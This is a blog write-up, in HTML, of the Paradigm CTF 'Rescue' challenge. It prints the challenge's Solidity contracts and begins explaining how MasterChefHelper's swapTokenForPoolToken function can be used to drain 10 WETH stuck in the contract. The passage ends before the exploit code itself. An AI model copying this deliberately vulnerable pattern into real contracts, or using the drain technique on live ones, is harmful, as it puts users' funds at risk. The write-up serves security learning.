@@ -1,0 +1,405 @@
+<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>Paradigm CTF - Rescue - MevSec Blog</title><meta name=Description content="I accidentally sent some WETH to a contract, can you help me?"><meta property="og:title" content="Paradigm CTF - Rescue"><meta property="og:description" content="I accidentally sent some WETH to a contract, can you help me?"><meta property="og:type" content="article"><meta property="og:url" content="/posts/paradigmctf-/"><meta property="og:image" content="/posts/paradigmctf-/Paradigm.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-12-30T00:00:00+00:00"><meta property="article:modified_time" content="2022-12-30T00:00:00+00:00"><meta property="og:site_name" content="MevSec Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/posts/paradigmctf-/Paradigm.png"><meta name=twitter:title content="Paradigm CTF - Rescue"><meta name=twitter:description content="I accidentally sent some WETH to a contract, can you help me?"><meta name=application-name content="MevSec's blog"><meta name=apple-mobile-web-app-title content="MevSec's blog"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=/posts/paradigmctf-/><link rel=next href=/posts/hacktm-dragon-slayer/><link rel=stylesheet href=/css/style.min.css><link rel=preload href=/lib/fontawesome-free/all.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=/lib/fontawesome-free/all.min.css></noscript><link rel=preload href=/lib/animate/animate.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=/lib/animate/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"Paradigm CTF - Rescue","inLanguage":"en-us","mainEntityOfPage":{"@type":"WebPage","@id":"\/posts\/paradigmctf-\/"},"image":[{"@type":"ImageObject","url":"\/posts\/paradigmctf-\/Paradigm.png","width":1703,"height":512}],"genre":"posts","keywords":"CTF, DEFI, UNISWAP","wordcount":1248,"url":"\/posts\/paradigmctf-\/","datePublished":"2022-12-30T00:00:00+00:00","dateModified":"2022-12-30T00:00:00+00:00","publisher":{"@type":"Organization","name":"Ethnical"},"author":{"@type":"Person","name":"Ethnical"},"description":"I accidentally sent some WETH to a contract, can you help me?"}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":""==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:""==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title="MevSec Blog">MevSec's blog</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>Posts </a><a class=menu-item href=/categories/>Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
+<input type=text placeholder="Search titles or contents..." id=search-input-desktop>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
+<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span>
+</span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme"><i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="MevSec Blog">MevSec's blog</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder="Search titles or contents..." id=search-input-mobile>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
+<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>Cancel</a></div><a class=menu-item href=/posts/ title>Posts</a><a class=menu-item href=/categories/ title>Categories</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
+<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>Contents</h2><div class="toc-content always-active" id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Paradigm CTF - Rescue</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=https://twitter.com/EthnicalInfo title=Author target=_blank rel="noopener noreffer author" class=author><i class="fas fa-user-circle fa-fw" aria-hidden=true></i>Ethnical</a></span>&nbsp;<span class=post-category>included in <a href=/categories/web3/><i class="far fa-folder fa-fw" aria-hidden=true></i>Web3</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime=2022-12-30>2022-12-30</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden=true></i>&nbsp;1248 words&nbsp;
+<i class="far fa-clock fa-fw" aria-hidden=true></i>&nbsp;6 minutes&nbsp;</div></div><div class="details toc" id=toc-static data-kept><div class="details-summary toc-title"><span>Contents</span>
+<span><i class="details-icon fas fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#1-what-the-contract-does>1. What the contract does?</a><ul><li><a href=#the-function-swaptokenforpooltoken>The function <code>swapTokenForPoolToken</code></a></li><li><a href=#socials--payload>Socials & Payload</a></li></ul></li></ul></nav></div></div><div class=content id=content><blockquote><p>I accidentally sent some WETH to a contract, can you help me?</p></blockquote><p>Here, we have 3 files here <code>MasterChefHelper.sol</code> <code>Setup.sol</code> <code>UniswapV2Like.sol</code></p><p>The vulnerable contract is <code>MasterChefHelper.sol</code> (<code>UniswapV2Like.sol</code> is <strong>useless</strong> here).</p><p>First, The <code>Setup.sol</code> contract is creating the CTF, the contract is creating a vulnerable fork of a MasterChef (from Sushi).</p><p>Then we can see the <em>whoops</em> comment in the code below, because the admin sent <strong>10 weth</strong> at the wrong address&mldr; So we have to steal the 10 weth from the <code>MasterChefHelper</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: UNLICENSED
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>8</span><span class=p>.</span><span class=mi>13</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=s>&#39;./MasterChefHelper.sol&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kd>interface</span> <span class=nc>WETH9</span> <span class=k>is</span> <span class=n>ERC20Like</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nf>deposit</span><span class=p>()</span> <span class=k>external</span> <span class=k>payable</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nf>withdraw</span><span class=p>(</span><span class=kt>uint256</span><span class=p>)</span> <span class=k>external</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>Setup</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=n>WETH9</span> <span class=k>public</span> <span class=k>constant</span> <span class=n>weth</span> <span class=o>=</span> <span class=n>WETH9</span><span class=p>(</span><span class=mh>0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>MasterChefHelper</span> <span class=k>public</span> <span class=k>immutable</span> <span class=n>mcHelper</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  <span class=kd>constructor</span><span class=p>()</span> <span class=k>payable</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>mcHelper</span> <span class=o>=</span> <span class=k>new</span> <span class=n>MasterChefHelper</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=n>weth</span><span class=p>.</span><span class=n>deposit</span><span class=p>{</span><span class=nb>value</span><span class=o>:</span> <span class=mi>10</span> <span class=kc>ether</span><span class=p>}();</span>
+</span></span><span class=line><span class=cl>    <span class=n>weth</span><span class=p>.</span><span class=nb>transfer</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=n>mcHelper</span><span class=p>),</span> <span class=mi>10</span> <span class=kc>ether</span><span class=p>);</span> <span class=c1>// whoops
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nf>isSolved</span><span class=p>()</span> <span class=k>external</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>bool</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>weth</span><span class=p>.</span><span class=n>balanceOf</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=n>mcHelper</span><span class=p>))</span> <span class=o>==</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>Let’s dive into the code of <code>MasterChefHelper.sol</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: UNLICENSED
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl><span class=k>pragma solidity</span> <span class=mi>0</span><span class=p>.</span><span class=mi>8</span><span class=p>.</span><span class=mi>16</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=s>&#34;./UniswapV2Like.sol&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kd>interface</span> <span class=nc>ERC20Like</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>transferFrom</span><span class=p>(</span><span class=kt>address</span><span class=p>,</span> <span class=kt>address</span><span class=p>,</span> <span class=kt>uint</span><span class=p>)</span> <span class=k>external</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>transfer</span><span class=p>(</span><span class=kt>address</span><span class=p>,</span> <span class=kt>uint</span><span class=p>)</span> <span class=k>external</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>approve</span><span class=p>(</span><span class=kt>address</span><span class=p>,</span> <span class=kt>uint</span><span class=p>)</span> <span class=k>external</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>balanceOf</span><span class=p>(</span><span class=kt>address</span><span class=p>)</span> <span class=k>external</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kd>interface</span> <span class=nc>MasterChefLike</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>poolInfo</span><span class=p>(</span><span class=kt>uint256</span> <span class=n>id</span><span class=p>)</span> <span class=k>external</span> <span class=k>returns</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl>        <span class=kt>address</span> <span class=n>lpToken</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=kt>uint256</span> <span class=n>allocPoint</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=kt>uint256</span> <span class=n>lastRewardBlock</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=kt>uint256</span> <span class=n>accSushiPerShare</span>
+</span></span><span class=line><span class=cl>    <span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>MasterChefHelper</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>MasterChefLike</span> <span class=k>public</span> <span class=k>constant</span> <span class=n>masterchef</span> <span class=o>=</span> <span class=n>MasterChefLike</span><span class=p>(</span><span class=mh>0xc2EdaD668740f1aA35E4D8f227fB8E17dcA888Cd</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>UniswapV2RouterLike</span> <span class=k>public</span> <span class=k>constant</span> <span class=n>router</span> <span class=o>=</span> <span class=n>UniswapV2RouterLike</span><span class=p>(</span><span class=mh>0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>swapTokenForPoolToken</span><span class=p>(</span><span class=kt>uint256</span> <span class=n>poolId</span><span class=p>,</span> <span class=kt>address</span> <span class=n>tokenIn</span><span class=p>,</span> <span class=kt>uint256</span> <span class=n>amountIn</span><span class=p>,</span> <span class=kt>uint256</span> <span class=n>minAmountOut</span><span class=p>)</span> <span class=k>external</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=kt>address</span> <span class=n>lpToken</span><span class=p>,,,)</span> <span class=o>=</span> <span class=n>masterchef</span><span class=p>.</span><span class=n>poolInfo</span><span class=p>(</span><span class=n>poolId</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=kt>address</span> <span class=n>tokenOut0</span> <span class=o>=</span> <span class=n>UniswapV2PairLike</span><span class=p>(</span><span class=n>lpToken</span><span class=p>).</span><span class=n>token0</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>        <span class=kt>address</span> <span class=n>tokenOut1</span> <span class=o>=</span> <span class=n>UniswapV2PairLike</span><span class=p>(</span><span class=n>lpToken</span><span class=p>).</span><span class=n>token1</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=n>ERC20Like</span><span class=p>(</span><span class=n>tokenIn</span><span class=p>).</span><span class=n>approve</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=n>router</span><span class=p>),</span> <span class=nb>type</span><span class=p>(</span><span class=nc>uint256</span><span class=p>).</span><span class=nb>max</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=n>ERC20Like</span><span class=p>(</span><span class=n>tokenOut0</span><span class=p>).</span><span class=n>approve</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=n>router</span><span class=p>),</span> <span class=nb>type</span><span class=p>(</span><span class=nc>uint256</span><span class=p>).</span><span class=nb>max</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=n>ERC20Like</span><span class=p>(</span><span class=n>tokenOut1</span><span class=p>).</span><span class=n>approve</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=n>router</span><span class=p>),</span> <span class=nb>type</span><span class=p>(</span><span class=nc>uint256</span><span class=p>).</span><span class=nb>max</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=n>ERC20Like</span><span class=p>(</span><span class=n>tokenIn</span><span class=p>).</span><span class=n>transferFrom</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>,</span> <span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>),</span> <span class=n>amountIn</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=c1>// swap for both tokens of the lp pool
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>_swap</span><span class=p>(</span><span class=n>tokenIn</span><span class=p>,</span> <span class=n>tokenOut0</span><span class=p>,</span> <span class=n>amountIn</span> <span class=o>/</span> <span class=mi>2</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=n>_swap</span><span class=p>(</span><span class=n>tokenIn</span><span class=p>,</span> <span class=n>tokenOut1</span><span class=p>,</span> <span class=n>amountIn</span> <span class=o>/</span> <span class=mi>2</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=c1>// add liquidity and give lp tokens to msg.sender
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>_addLiquidity</span><span class=p>(</span><span class=n>tokenOut0</span><span class=p>,</span> <span class=n>tokenOut1</span><span class=p>,</span> <span class=n>minAmountOut</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>_addLiquidity</span><span class=p>(</span><span class=kt>address</span> <span class=n>token0</span><span class=p>,</span> <span class=kt>address</span> <span class=n>token1</span><span class=p>,</span> <span class=kt>uint256</span> <span class=n>minAmountOut</span><span class=p>)</span> <span class=k>internal</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=p>(,,</span> <span class=kt>uint256</span> <span class=n>amountOut</span><span class=p>)</span> <span class=o>=</span> <span class=n>router</span><span class=p>.</span><span class=n>addLiquidity</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>            <span class=n>token0</span><span class=p>,</span> 
+</span></span><span class=line><span class=cl>            <span class=n>token1</span><span class=p>,</span> 
+</span></span><span class=line><span class=cl>            <span class=n>ERC20Like</span><span class=p>(</span><span class=n>token0</span><span class=p>).</span><span class=n>balanceOf</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>)),</span> 
+</span></span><span class=line><span class=cl>            <span class=n>ERC20Like</span><span class=p>(</span><span class=n>token1</span><span class=p>).</span><span class=n>balanceOf</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>)),</span> 
+</span></span><span class=line><span class=cl>            <span class=mi>0</span><span class=p>,</span> 
+</span></span><span class=line><span class=cl>            <span class=mi>0</span><span class=p>,</span> 
+</span></span><span class=line><span class=cl>            <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>,</span> 
+</span></span><span class=line><span class=cl>            <span class=nb>block</span><span class=p>.</span><span class=nb>timestamp</span>
+</span></span><span class=line><span class=cl>        <span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nb>require</span><span class=p>(</span><span class=n>amountOut</span> <span class=o>&gt;=</span> <span class=n>minAmountOut</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>_swap</span><span class=p>(</span><span class=kt>address</span> <span class=n>tokenIn</span><span class=p>,</span> <span class=kt>address</span> <span class=n>tokenOut</span><span class=p>,</span> <span class=kt>uint256</span> <span class=n>amountIn</span><span class=p>)</span> <span class=k>internal</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=kt>address</span><span class=p>[]</span> <span class=k>memory</span> <span class=n>path</span> <span class=o>=</span> <span class=k>new</span> <span class=kt>address</span><span class=p>[](</span><span class=mi>2</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=n>path</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=n>tokenIn</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=n>path</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=n>tokenOut</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=n>router</span><span class=p>.</span><span class=n>swapExactTokensForTokens</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>            <span class=n>amountIn</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=mi>0</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=n>path</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>),</span>
+</span></span><span class=line><span class=cl>            <span class=nb>block</span><span class=p>.</span><span class=nb>timestamp</span>
+</span></span><span class=line><span class=cl>        <span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=1-what-the-contract-does>1. What the contract does?</h2><h3 id=the-function-swaptokenforpooltoken>The function <code>swapTokenForPoolToken</code></h3><p>This is the function, we will use to the steal the <strong>10 weth</strong> from the <code>MasterChefHelper</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl> <span class=kd>function</span> <span class=nf>swapTokenForPoolToken</span><span class=p>(</span><span class=kt>uint256</span> <span class=n>poolId</span><span class=p>,</span> <span class=kt>address</span> <span class=n>tokenIn</span><span class=p>,</span> <span class=kt>uint256</span> <span class=n>amountIn</span><span class=p>,</span> <span class=kt>uint256</span> <span class=n>minAmountOut</span><span class=p>)</span> <span class=k>external</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=kt>address</span> <span class=n>lpToken</span><span class=p>,,,)</span> <span class=o>=</span> <span class=n>masterchef</span><span class=p>.</span><span class=n>poolInfo</span><span class=p>(</span><span class=n>poolId</span><span class=p>);</span> <span class=c1>// get the LPaddress from the poolInfo
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=kt>address</span> <span class=n>tokenOut0</span> <span class=o>=</span> <span class=n>UniswapV2PairLike</span><span class=p>(</span><span class=n>lpToken</span><span class=p>).</span><span class=n>token0</span><span class=p>();</span> <span class=c1>//get the token0 of the pool
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=kt>address</span> <span class=n>tokenOut1</span> <span class=o>=</span> <span class=n>UniswapV2PairLike</span><span class=p>(</span><span class=n>lpToken</span><span class=p>).</span><span class=n>token1</span><span class=p>();</span> <span class=c1>//get the token0 of the pool
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl>        <span class=n>ERC20Like</span><span class=p>(</span><span class=n>tokenIn</span><span class=p>).</span><span class=n>approve</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=n>router</span><span class=p>),</span> <span class=nb>type</span><span class=p>(</span><span class=nc>uint256</span><span class=p>).</span><span class=nb>max</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=n>ERC20Like</span><span class=p>(</span><span class=n>tokenOut0</span><span class=p>).</span><span class=n>approve</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=n>router</span><span class=p>),</span> <span class=nb>type</span><span class=p>(</span><span class=nc>uint256</span><span class=p>).</span><span class=nb>max</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=n>ERC20Like</span><span class=p>(</span><span class=n>tokenOut1</span><span class=p>).</span><span class=n>approve</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=n>router</span><span class=p>),</span> <span class=nb>type</span><span class=p>(</span><span class=nc>uint256</span><span class=p>).</span><span class=nb>max</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=n>ERC20Like</span><span class=p>(</span><span class=n>tokenIn</span><span class=p>).</span><span class=n>transferFrom</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>,</span> <span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>),</span> <span class=n>amountIn</span><span class=p>);</span> <span class=c1>//Tranfer the tokenIn to the masterchef
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl>        <span class=c1>// swap for both tokens of the lp pool
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>_swap</span><span class=p>(</span><span class=n>tokenIn</span><span class=p>,</span> <span class=n>tokenOut0</span><span class=p>,</span> <span class=n>amountIn</span> <span class=o>/</span> <span class=mi>2</span><span class=p>);</span>  <span class=c1>//swap half of the amount
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>_swap</span><span class=p>(</span><span class=n>tokenIn</span><span class=p>,</span> <span class=n>tokenOut1</span><span class=p>,</span> <span class=n>amountIn</span> <span class=o>/</span> <span class=mi>2</span><span class=p>);</span> <span class=c1>//swap half of the amount
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl>        <span class=c1>// add liquidity and give lp tokens to msg.sender
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>_addLiquidity</span><span class=p>(</span><span class=n>tokenOut0</span><span class=p>,</span> <span class=n>tokenOut1</span><span class=p>,</span> <span class=n>minAmountOut</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
